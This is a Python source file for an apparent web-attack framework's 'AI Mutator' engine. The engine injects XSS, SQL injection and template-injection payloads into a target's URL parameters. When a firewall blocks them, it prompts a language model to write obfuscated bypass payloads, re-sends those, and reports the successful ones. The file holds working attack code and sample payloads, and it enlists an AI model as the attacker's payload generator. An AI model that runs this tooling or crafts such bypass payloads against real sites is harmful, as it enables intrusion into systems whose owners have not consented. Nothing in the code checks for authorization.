import asyncio
import httpx
from typing import Any, Dict, List
import urllib.parse
from rich.console import Console

from aura.core.engine_base import AbstractEngine
from aura.ui.formatter import console
from aura.core.brain import AuraBrain

class AIMutatorEngine(AbstractEngine):
    """
    The AI Mutator (Phase 6):
    Leverages the local LLM brain to dynamically draft WAF-evading payloads 
    and complex injection sequences.
    """
    ENGINE_ID = "ai_mutator"

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.brain = kwargs.get("brain") or AuraBrain()
        self.timeout = 15.0
        self.results = []
        # Fallback cache to prevent hammering the LLM for identical blocks
        self.payload_cache = {}

    async def _ask_brain_for_mutation(self, attack_class: str, error_context: str) -> str:
        """Asks the central AuraBrain LLM to invent a bypass payload."""
        prompt = (
            f"You are an expert penetration testing AI. We attempted an {attack_class} "
            f"attack but hit a WAF/Filter. The server responded with: '{error_context}'. "
            f"Generate exactly ONE highly-obfuscated, bleeding-edge payload (e.g., Polyglot, "
            f"Hex-encoded, Unicode normalized) to bypass this specific filter. "
            f"Do not include any text other than the raw payload itself. Do not use Markdown blocks."
        )
        
        # Check cache
        if error_context in self.payload_cache:
            return self.payload_cache[error_context]
            
        self.emit_progress(step=f"🧠 Brain spinning up polyglot for {attack_class} bypassed...")
        try:
            # We await the brain if it supports async, otherwise wrap in thread
            # Assuming brain.analyze is sync based on older code, if not, we use run_in_executor
            loop = asyncio.get_event_loop()
            raw_response = await loop.run_in_executor(None, self.brain.analyze, prompt)
            
            # Clean up potential markdown formatting from LLM
            clean_payload = raw_response.strip().strip("`").strip("'").strip('"')
            if clean_payload:
                 self.payload_cache[error_context] = clean_payload
                 return clean_payload
        except Exception as e:
            console.print(f"[dim red]Brain mutation failed: {e}[/dim red]")
            
        # Hardcoded fallback if AI fails/times out
        return "1' OR '1'='1' --" if attack_class == "SQLi" else "<svg/onload=alert(1)>"

    async def _test_endpoint(self, client: httpx.AsyncClient, url: str):
        """Standard injection pipeline using LLM dynamically generated variants."""
        parsed = urllib.parse.urlparse(url)
        if not parsed.query:
            return # Only target endpoints with parameters for now
            
        qs = urllib.parse.parse_qs(parsed.query)
        vuln_classes = ["XSS", "SQLi", "SSTI"]
        
        for v_class in vuln_classes:
            initial_payload = "<script>alert(1)</script>" if v_class == "XSS" else "' OR 1=1--"
            if v_class == "SSTI": initial_payload = "${7*7}"
            
            # Send noisy baseline
            mutated_qs = {k: initial_payload for k in qs}
            enc_qs = urllib.parse.urlencode(mutated_qs, doseq=True)
            target = urllib.parse.urlunparse(parsed._replace(query=enc_qs))
            
            try:
                # Disable follow_redirects to see pure WAF blocks
                resp = await client.get(target, follow_redirects=False)
                # If WAF blocks it (403/406) or backend crashes (500), engage Brain!
                if resp.status_code in [403, 406, 500]:
                    server_header = resp.headers.get("Server", "Unknown WAF / Backend")
                    error_ctx = f"HTTP {resp.status_code} blocked by {server_header}"
                    
                    # 1. Ask AI for Mutation
                    ai_payload = await self._ask_brain_for_mutation(v_class, error_ctx)
                    
                    # 2. Re-fire AI Payload
                    ai_qs = {k: ai_payload for k in qs}
                    ai_enc = urllib.parse.urlencode(ai_qs, doseq=True)
                    ai_target = urllib.parse.urlunparse(parsed._replace(query=ai_enc))
                    
                    ai_resp = await client.get(ai_target, follow_redirects=True)
                    
                    # 3. Analyze success
                    success = False
                    reason = ""
                    if ai_resp.status_code == 200:
                        body_lower = ai_resp.text.lower()
                        if v_class == "XSS" and ai_payload.lower() in body_lower:
                            success = True
                            reason = "AI Payload reflected flawlessly in HTTP 200 OK."
                        elif v_class == "SQLi" and ("error" in body_lower or len(ai_resp.text) > len(resp.text)+500):
                             success = True
                             reason = "AI Payload successfully caused SQL anomaly (200 OK)."
                        elif v_class == "SSTI" and "49" in body_lower and "${7*7}" not in body_lower:
                             success = True
                             reason = "AI Payload executed SSTI (Math resolved to 49)."
                             
                    if success:
                        console.print(f"[bold red][☠️ AI MUTATOR] WAF Bypassed for {v_class} at {url}[/bold red]")
                        vuln = {
                            "type": f"AI-Mutated {v_class}",
                            "severity": "CRITICAL",
                            "url": url,
                            "content": f"The AURA Brain natively bypassed a WAF ({server_header}) using payload: {ai_payload}",
                            "evidence": {
                                "original_blocked_status": resp.status_code,
                                "ai_payload_success": ai_payload,
                                "reason": reason
                            }
                        }
                        self.results.append(vuln)
                        self.emit_vulnerability(vuln)
                        break # Stop further tests on this param to save speed
            except BaseException:
                pass


    async def run(self, **kwargs) -> Any:
        self.emit_progress(step="Booting The AI Mutator Engine...")
        
        target = self.context.target if hasattr(self.context, 'target') else kwargs.get("target")
        if not target:
            return []
            
        if not target.startswith("http"):
            target = "https://" + target

        intel = self.context.get_intel() if hasattr(self.context, "get_intel") else {}
        urls = intel.get("urls", set())
        
        endpoints_to_test = [u for u in urls if "?" in u]
        if not endpoints_to_test:
            # Blind probe fallback
            endpoints_to_test = [
                f"{target}/search?q=test",
                f"{target}/api/products?id=1"
            ]

        self.emit_progress(step=f"Armed AI Mutator against {len(endpoints_to_test)} parameter-heavy endpoints...")

        # Limits to prevent completely blowing up the LLM if it's local
        limits = httpx.Limits(max_keepalive_connections=20, max_connections=40)
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False, limits=limits) as client:
            tasks = []
            for url in endpoints_to_test:
                tasks.append(self._test_endpoint(client, url))
                
                # Careful batching (Batch of 10) to not slam the GPU / API
                if len(tasks) >= 10:
                    await asyncio.gather(*tasks)
                    tasks = []
                    
            if tasks:
                await asyncio.gather(*tasks)
                
        return self.results
